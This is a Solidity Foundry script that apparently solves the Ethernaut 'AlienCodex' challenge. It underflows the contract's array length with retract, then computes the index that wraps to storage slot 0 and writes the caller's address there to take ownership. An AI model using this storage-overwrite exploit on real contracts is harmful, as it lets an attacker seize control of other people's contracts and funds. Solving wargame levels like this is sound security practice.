// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {AlienCodex} from "../src/AlienCodex.sol";

contract SolveAlienCodex is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        AlienCodex alienCodex = AlienCodex(vm.envAddress("ALIENCODEX_ADDRESS"));
        alienCodex.makeContact();
        alienCodex.retract();
        uint256 codexStartSlot = uint256(keccak256(abi.encode(uint256(1))));
        uint256 indexToSlot0 = type(uint256).max - codexStartSlot + 1;
        bytes32 payload = bytes32(uint256(uint160(msg.sender)));
        alienCodex.revise(indexToSlot0, payload);
        vm.stopBroadcast();
    }
}
